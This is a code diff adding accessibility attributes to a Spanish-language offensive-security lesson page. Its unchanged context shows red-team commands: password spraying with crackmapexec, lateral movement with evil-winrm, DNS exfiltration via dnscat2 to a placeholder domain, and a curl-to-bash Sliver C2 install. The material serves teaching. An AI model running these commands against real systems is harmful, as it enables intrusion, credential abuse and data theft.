@@ -12,8 +12,8 @@
     <link rel="stylesheet" href="../styles.css">
 </head>
 <body>
-    <div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
-    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+    <div class="bg-grid" aria-hidden="true"></div><div class="bg-glow bg-glow-1" aria-hidden="true"></div><div class="bg-glow bg-glow-2" aria-hidden="true"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
     <main class="lesson-page">
         <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 3</span><span>›</span><span>Lección 15</span></div>
         <div class="lesson-hero">
@@ -122,7 +122,7 @@
         </div>
 
         <div class="lesson-section" id="reconocimiento"><h2>6. Reconocimiento (OSINT)</h2>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">OSINT</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">OSINT</span></div>
                 <pre><code><span style="color:#546e7a"># Reconocimiento pasivo de dominios</span>
 <span style="color:#00e676">$</span> amass enum -passive -d empresa.com
 <span style="color:#00e676">$</span> subfinder -d empresa.com
@@ -153,7 +153,7 @@
                     <tr><td><strong>VPN/RDP expuesto</strong></td><td>Credenciales filtradas o débiles en servicios remotos</td><td><code>Hydra</code>, <code>Crowbar</code></td></tr>
                 </tbody>
             </table></div>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Password Spraying</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Password Spraying</span></div>
                 <pre><code><span style="color:#546e7a"># Probar "Company2026!" contra todos los usuarios del dominio</span>
 <span style="color:#00e676">$</span> crackmapexec smb DC_IP -u usuarios.txt -p 'Company2026!' --continue-on-success
 
@@ -163,7 +163,7 @@
         </div>
 
         <div class="lesson-section" id="movimiento"><h2>8. Movimiento lateral y escalada</h2>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Movimiento lateral</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Movimiento lateral</span></div>
                 <pre><code><span style="color:#546e7a"># Moverse a otra máquina via WinRM</span>
 <span style="color:#00e676">$</span> evil-winrm -i 10.10.10.5 -u admin -p 'Password123'
 
@@ -203,7 +203,7 @@
         </div>
 
         <div class="lesson-section" id="exfiltracion"><h2>10. Exfiltración de datos</h2>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Exfiltración</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Exfiltración</span></div>
                 <pre><code><span style="color:#546e7a"># Exfiltración por DNS (difícil de detectar)</span>
 <span style="color:#00e676">$</span> dnscat2 --dns server=tudominio.com
 
@@ -225,7 +225,7 @@
                     <tr><td><strong>Mythic</strong></td><td>Open Source</td><td>Framework modular con múltiples agentes y perfiles C2.</td></tr>
                 </tbody>
             </table></div>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Sliver C2 básico</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Sliver C2 básico</span></div>
                 <pre><code><span style="color:#546e7a"># Instalar Sliver</span>
 <span style="color:#00e676">$</span> curl https://sliver.sh/install | sudo bash
 
